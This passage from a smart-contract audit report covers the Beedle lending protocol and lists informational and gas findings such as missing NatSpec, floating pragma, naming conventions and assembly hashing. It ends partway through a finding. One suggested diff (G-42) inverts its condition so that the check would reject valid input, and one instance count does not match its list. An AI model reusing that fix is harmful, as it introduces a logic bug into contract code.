_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [tsar](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [codeslide](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/SeeVulnerabilityDetailsForLinks

## Summary
The [Solidity documentation recommends](https://docs.soliditylang.org/en/latest/natspec-format.html) "that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI)." NatSpec documentation should be used for improved readability, a better user experience, enhanced auditability, enablement of automated testing and verification, and to promote standardization and interoperability.
## Vulnerability Details
There are 16 instances of this issue.
<details><summary>View 16 Instances</summary>

```solidity
File: src/Beedle.sol

11:     constructor() ERC20("Beedle", "BDL") ERC20Permit("Beedle") Ownable(msg.sender) {

36:     function mint(address to, uint256 amount) external onlyOwner {
```

| File Link                                                                       | Instance Count | Instance Links                                                                                                                                          |
| :------------------------------------------------------------------------------ | -------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [Beedle.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol) |              2 | [11](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L11),[36](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L36) |
___
```solidity
File: src/Fees.sol

19:     constructor(address _weth, address _staking) {
```

| File Link                                                                   | Instance Count | Instance Link                                                             |
| :-------------------------------------------------------------------------- | -------------: | :------------------------------------------------------------------------ |
| [Fees.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol) |              1 | [19](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L19) |
___
```solidity
File: src/Lender.sol

73:     constructor() Ownable(msg.sender) {

108:     function getPoolId(
109:         address lender,
110:         address loanToken,
111:         address collateralToken
112:     ) public pure returns (bytes32 poolId) {

116:     function getLoanDebt(uint256 loanId) external view returns (uint256 debt) {
```

| File Link                                                                       | Instance Count | Instance Links                                                                                                                                                                                                                          |
| :------------------------------------------------------------------------------ | -------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Lender.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol) |              3 | [73](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L73),[108](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L108),[116](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L116) |
___
```solidity
File: src/Staking.sol

8:     function claim(address) external;

31:     constructor(address _token, address _weth) Ownable(msg.sender) {
```

| File Link                                                                         | Instance Count | Instance Links                                                                                                                                          |
| :-------------------------------------------------------------------------------- | -------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [Staking.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol) |              2 | [8](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L8),[31](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L31) |
___
```solidity
File: src/interfaces/IERC20.sol

7:     function totalSupply() external view returns (uint256);

8:     function balanceOf(address account) external view returns (uint256);

9:     function transfer(address to, uint256 amount) external returns (bool);

10:     function allowance(address owner, address spender) external view returns (uint256);

11:     function approve(address spender, uint256 amount) external returns (bool);

12:     function transferFrom(address from, address to, uint256 amount) external returns (bool);
```

| File Link                                                                                  | Instance Count | Instance Links                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| :----------------------------------------------------------------------------------------- | -------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [IERC20.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol) |              6 | [7](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L7),[8](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L8),[9](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L9),[10](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L10),[11](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L11),[12](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L12) |
___
```solidity
File: src/interfaces/ISwapRouter.sol

16:     function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
```

| File Link                                                                                            | Instance Count | Instance Link                                                                               |
| :--------------------------------------------------------------------------------------------------- | -------------: | :------------------------------------------------------------------------------------------ |
| [ISwapRouter.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/ISwapRouter.sol) |              1 | [16](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/ISwapRouter.sol#L16) |
___
```solidity
File: src/utils/Ownable.sol

19:     function transferOwnership(address _owner) public virtual onlyOwner {
```

| File Link                                                                               | Instance Count | Instance Link                                                                      |
| :-------------------------------------------------------------------------------------- | -------------: | :--------------------------------------------------------------------------------- |
| [Ownable.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol) |              1 | [19](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L19) |
___
</details>

## Impact
Decreased readability and usability.
## Tools Used
baudit: a custom static code analysis tool; manual review
## Recommendations
Add NatSpec comments for all public functions.

## <a id='G-29'></a>G-29. Medium4-StorageOccupation-CarlosAlegreUr

_Submitted by [charlescheerful](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol

# Software Audit Report 📑

---

## **Summary 📌**

This report outlines potential exploits where well-funded attackers might tamper with the contract's storage slots, leading to higher operational costs.

---

## **Vulnerability Details 🔍**

In **`Lender.sol`**:

### Exploits by Attackers with Enough Capital

> 📘 **Notice** ℹ️: Some solutions are explained in the **Recommendations** section. They may differ in implementation so I've linked trusted implementations like OpenZeppelin contracts.

- **Infinite Pool Creation:**

  - **Problem** 🚧: The contract allows infinite pool creation, opening doors for DoS attacks via storage slot occupancy, increasing transaction costs.

- **Unregulated Loans Creation & Borrowing:**

  - **Problem** 🚧: Any address can establish a pool and increase the size of the loans array by borrowing insignificant tokens.

- **No Control over Tokens Used for Lending:**
  - **Problem** 🚧: Absence of mechanisms to control tokens lets attackers manipulate the system with only the cost of gas fees and function calls.

---

## **Impact 📈**

Redundant storage utilization can increase operational expenses.

---

## **Tools Used 🛠️**

- Manual audit.
- Slither.

---

## **Recommendations 🎯**

Considering future plans for a governance model here are some suggestions to face the problems:

- **Authorizing** the **governance to blacklist** suspicious addresses.

- **Infinite Pool Creation**:

  - Cap the number of pools an individual can establish.
    - Use a variable like `mapping(address => uint256) addressToNumOfPoolsCreated`.
    - Introduce a constant like `MAX_POOLS_PER_USER`.
    - Adjust the mapping number each time a pool is created or deleted.
    - Mark the `setPool()` function as non-reentrant, slowing the rate of pool creation and providing the governance more reaction time. For this, you can use OpenZeppelin's [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard).

- **Infinite Loans**:

  - Impose a cap on borrowings per address, similar to how it's addressed in the pool limits solution.
  - Note a potential reentrancy vulnerability with fake IERC20 contracts during `borrow()` calls. Again, use `ReentrancyGuard` to mitigate this risk.

- **Token Control Solutions**:
  - Enforce token whitelist/blacklist methods. For that, you could use _roles_ from OpenZeppelin's [AccessControl](https://docs.openzeppelin.com/contracts/2.x/access-control).
  - Propose a fee for pool creation or an assurance mechanism with a valuable asset, such as the native blockchain coin, reclaimable once the lending is over.

> 🚧 **Note** ⚠️: Implementing solutions to these problems requires significant code modification. A second audit is recommended post-implementation to ensure no new bugs are introduced.

---

## <a id='G-30'></a>G-30. Don't use draft versions in production

_Submitted by [qbs](https://profiles.cyfrin.io/u/undefined), [pina](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined), [Deivitto](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Deivitto](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Beedle.sol#L6

## Summary
Using draft versions is not recommended for productions. Additionally, the non draft version is already available
## Vulnerability Details

## Impact

## Tools Used
Manual
## Recommendations
Use actual non draft [version of ERC20Permit](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Permit.sol) 
## <a id='G-31'></a>G-31. `setPool()` should check if `p.minLoanSize` < p.poolBalance

_Submitted by [Bughunter101](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L134

## Summary

`setPool()` should check if `p.minLoanSize` < `p.poolBalance`. If `p.minLoanSize` > `p.poolBalance`,it will cause borrower can not borrow the fund. Because when borrowing , `borrow()` function will check `if (debt < pool.minLoanSize)` and `if (debt > pool.poolBalance)`

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L242

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L134

## Impact

It will cause pool useless

## Tools Used

manual

## Recommendations

check if `p.minLoanSize` < p.poolBalance
## <a id='G-32'></a>G-32. Large multiples of ten should use scientific notation

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined). Selected submission by: [SolSaver](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

## Summary
Large multiples of ten should use scientific notation

## Vulnerability Details
Use (e.g. 1e6) rather than decimal literals (e.g. 100000), for better code readability.

```solidity
File: src/Lender.sol

59:     uint256 public constant MAX_INTEREST_RATE = 100000;

265:             uint256 fees = (debt * borrowerFee) / 10000;

561:             uint256 govFee = (borrowerFee * loan.collateral) / 10000;

650:                 uint256 fee = (borrowerFee * (debt - debtToPay)) / 10000;

724:         interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;

725:         fees = (lenderFee * interest) / 10000;

```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

## Tools Used
Manual Code Review by SolSaver

## Recommendations
Large multiples of ten should use scientific notation

## <a id='G-33'></a>G-33. Constants in comparisons should appear on the left side

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [SolSaver](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol

## Summary
Constants in comparisons should appear on the left side

## Vulnerability Details
Doing so will prevent [typo bugs](https://www.moserware.com/2008/01/constants-on-left-are-better-but-this.html)

```solidity
File: src/Lender.sol

85:         if (_fee > 5000) revert FeeTooHigh();

93:         if (_fee > 500) revert FeeTooHigh();

184:         if (amount == 0) revert PoolConfig();

200:         if (amount == 0) revert PoolConfig();

212:         if (maxLoanRatio == 0) revert PoolConfig();

244:             if (collateral == 0) revert ZeroCollateral();

```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

```solidity
File: src/Staking.sol

63:         if (totalSupply > 0) {

67:                 if (_diff > 0) {

68:                     uint256 _ratio = _diff * 1e18 / totalSupply;

69:                     if (_ratio > 0) {

83:         if (_supplied > 0) {

87:             if (_delta > 0) {

```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol


## Tools Used
Manual Code Review by SolSaver

## Recommendations
Constants in comparisons should appear on the left side

## <a id='G-34'></a>G-34. Floating pragma in all contracts

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [0xaadhi](https://profiles.cyfrin.io/u/undefined), [tsar](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [ChainSentry](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [larsson](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined). Selected submission by: [nisedo](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/interfaces/ISwapRouter.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Errors.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Ownable.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Structs.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/interfaces/IERC20.sol#L2

## Summary
Floating pragma are used in all contracts instead of fixed pragma as recommended in the best practices.

## Vulnerability Details
Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities.

## Impact
Potential bugs introduction if contract deployed using another pragma than the one tested with.

## Tools Used
Manual review

## Recommendations
Consider locking the pragma in all the contracts to the 0.8.19 version.
It is not recommended to use a floating pragma in production.
## <a id='G-35'></a>G-35. Conformance to Solidity naming conventions

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [tsar](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined). Selected submission by: [xfu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/utils/Ownable.sol#L19

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Fees.sol#L26

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol#L38

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol#L46

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L84

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L92

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L100

## Summary

## Vulnerability Details

Solidity defines a [naming convention](https://solidity.readthedocs.io/en/v0.4.25/style-guide.html#naming-conventions) that should be followed.

#### Rule exceptions

- Allow constant variable name/symbol/decimals to be lowercase (`ERC20`).
- Allow `_` at the beginning of the `mixed_case` match for private variables and unused parameters.

**There are `10` instances of this issue:**

- Parameter [Ownable.transferOwnership(address).\_owner](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/utils/Ownable.sol#L19) is not in mixedCase

- Parameter [Fees.sellProfits(address).\_profits](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Fees.sol#L26) is not in mixedCase

- Parameter [Staking.deposit(uint256).\_amount](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol#L38) is not in mixedCase

- Parameter [Staking.withdraw(uint256).\_amount](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol#L46) is not in mixedCase

- Parameter [Lender.setLenderFee(uint256).\_fee](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L84) is not in mixedCase

- Parameter [Lender.setBorrowerFee(uint256).\_fee](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L92) is not in mixedCase

- Parameter [Lender.setFeeReceiver(address).\_feeReceiver](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L100) is not in mixedCase


## Impact

## Tools Used

## Recommendations
Follow the Solidity [naming convention](https://solidity.readthedocs.io/en/latest/style-guide.html#naming-conventions).
## <a id='G-36'></a>G-36. [L-06] Some imported libraries are not used

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [pina](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined). Selected submission by: [pina](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L4-L5

## Summary
The Errors and Structs libraries were imported but are not used in any implementation.


## Impact
It is good practice to do this to keep your code clean and easy to read. This can help prevent bugs and make it easier to review and maintain the code in the future.

## Tools Used
Manual code review

## Recommendations
Delete these lines :
```diff
- import "./utils/Errors.sol";
- import "./utils/Structs.sol";
```
## <a id='G-37'></a>G-37. No use of Ownable in Staking contract.

_Submitted by [0xbug](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [0xumarkhatab](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xsandy](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L5

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L11

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L31C1-L31C69

## Summary
``Ownable`` used in ``Staking.sol`` is not required.

## Vulnerability Details
As no ``onlyOwner`` or ``transferOwnership`` modifier is used in the contract ``Staking.sol``, the inheritance to ``Ownable`` and it's initialization in constructor to ``msg.sender`` can be removed to save some gas.

## Tools Used
Manual Analysis

## Recommendations
Remove ``Ownable`` inheritance and remove it's initialization in the constructor.
## <a id='G-38'></a>G-38. Use assembly to perform hashing instead of Solidity to reduce gas costs.

_Submitted by [1nc0gn170](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined). Selected submission by: [1nc0gn170](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L108-L114

## Summary

Since the function `getPoolId` is used in multiple locations within the code, it is better to optimize the function in terms of gas cost. For performing the `keccak256` hash operation, it is more efficient to use inline assembly. This approach saves nearly ~150 gas.

```solidity
// Before Gas - 782
function getPoolId(
        address lender,
        address loanToken,
        address collateralToken
    ) public pure returns (bytes32 poolId) {    
        poolId = keccak256(abi.encode(lender, loanToken, collateralToken));
    }

// After Gas - 626
    function getPoolIdAss(
        address lender,
        address loanToken,
        address collateralToken
    ) public pure returns (bytes32 poolId) {
        assembly {
            let data := mload(0x40)
            mstore(data, lender)
            mstore(add(data, 0x20), loanToken)
            mstore(add(data, 0x40), collateralToken)

            poolId := keccak256(data, 0x60)
        }
    }
```

## Tools Used
Remix

## <a id='G-39'></a>G-39. Strict comparisons are more expensive than non-strict ones

_Submitted by [0xl3xx](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined). Selected submission by: [inallhonesty](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L85

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L93

## Summary

The first two governance function from Lender.sol, setLenderFee and setBorrowerFee, check the input against hardcoded values

This check could be optimized by using non-strict comparison `>=` instead of strict comparison `>`.

## Tools Used

Manual review

## Recommendations

```diff
-if (_fee > 5000) revert FeeTooHigh();
+if (_fee >= 5001) revert FeeTooHigh();

-if (_fee > 500) revert FeeTooHigh()
+if (_fee >= 501) revert FeeTooHigh()

```
## <a id='G-40'></a>G-40. Lack of pause pool function in Lender contract

_Submitted by [qckhp](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol

## Summary
If a lender would like to stop lending, they have no option to do it.

## Vulnerability Details
Lets say Pool A has an ongoing loan of 10 token A, and 0 liquidity in the pool.
Pool A does not want to initialize any more loans.
As soon as the Loan of 10 token A is paid back by the borrower it's possible to take it as a loan and maybe the pool owner is not able to withdraw it before it happens.

## Impact
Possibility of lender cannot access their liquidity

## Tools Used
Manual review

## Recommendations
Add an option to pause the pool -> so no new loans can be taken from the available liquidity
## <a id='G-41'></a>G-41. Should check mapping key exists before using

_Submitted by [fakemonkgin](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L117

## Summary
lots of devs forget that using a random key to get a value from the mapping will return an object with default values

## Vulnerability Details
```solidity
Loan memory loan = loans[loanId]
```
some flawed validation that does not check the zero values in a non-existing mapping value

## Impact
If loadId doesn't exist, loan will be default value, may interfere data usage afterwards

## Tools Used
Manual Review

## Recommendations
Add explicit checks to revert in this case, validate mapping key exists before using
## <a id='G-42'></a>G-42. Use if + custom errors instead of using require + string

_Submitted by [souilos](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [contractsecure](https://profiles.cyfrin.io/u/undefined), [hunter_w3b](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined), [engineer](https://profiles.cyfrin.io/u/undefined). Selected submission by: [inallhonesty](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L27

## Summary
The require statement from Fees.sol `require(_profits != WETH, "not allowed");` should be replaced with an if statement + custom error:

Fees.sol:

```diff
- require(_profits != WETH, "not allowed");
+ if (_profits != WETH) revert WETHNotAllowed();
```

Errors.sol:
```
+ WETHNotAllowed();
```

## <a id='G-43'></a>G-43. Don't initialize `uint/int` variables with default value

_Submitted by [souilos](https://profiles.cyfrin.io/u/undefined), [tsar](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [iurii2002](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [0xanjan143](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [Saskloch](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [fondevs](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined). Selected submission by: [timenov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L14

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L16

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L233

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L293

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L359

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L438

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L549

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L592

## Summary
There is not need to initialize `uint/int` variable with value `0`

## Recommendations
Remove `= 0`
## <a id='G-44'></a>G-44. Mixed usage of `int`/`uint` with `int256`/`uint256`

_Submitted by [souilos](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ch0bu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L46

## Summary
There are two instances where `uint` has been used and everywhere else `uint256` is used

## Vulnerability Details
It is recommended to use one form consistently throughout all contracts. `int256`/`uint256` are the preferred type names as they're used for function signatures

```
38	function deposit(uint _amount) external {
46	function withdraw(uint _amount) external {
```
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L46

## Impact
Informational

## Tools Used
Manual review

## Recommendations
Use `uint256` consistently across all contracts 
## <a id='G-45'></a>G-45. Multiple `address` mappings can be combined into a single mapping of an `address` to a `struct`, where appropriate

_Submitted by [souilos](https://profiles.cyfrin.io/u/undefined), [Dharma](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [larsson](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [ericselvig](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ericselvig](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L19-L24

## Summary
```solidity
File: src/Staking.sol

19:  mapping(address => uint256) public supplyIndex;
22:  mapping(address => uint256) public balances;
24:  mapping(address => uint256) public claimable;
```
## <a id='G-46'></a>G-46. Using `x >> constant(uint)` with the right shift operator is a more gas-efficient

_Submitted by [souilos](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined). Selected submission by: [xfu](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol#L88

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L265

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L561

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L650

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L724

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L725

## Summary

